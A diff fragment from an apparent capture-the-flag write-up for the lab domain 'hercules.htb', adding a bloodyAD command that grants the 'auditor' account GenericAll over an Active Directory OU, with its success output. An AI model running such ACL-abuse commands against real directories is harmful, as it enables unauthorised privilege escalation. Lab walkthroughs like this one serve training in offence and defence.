@@ -1084,8 +1084,13 @@ bloodyAD --host dc.hercules.htb -d hercules.htb -k set owner 'OU=Forest Migratio
 This granted ownership
 
 ```python
-
+bloodyAD --host dc.hercules.htb -d hercules.htb -k add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' 'auditor'
+[+] auditor has now GenericAll on OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
 ```
+
+I now have GenericAll over the OU
+
+
 
 
 
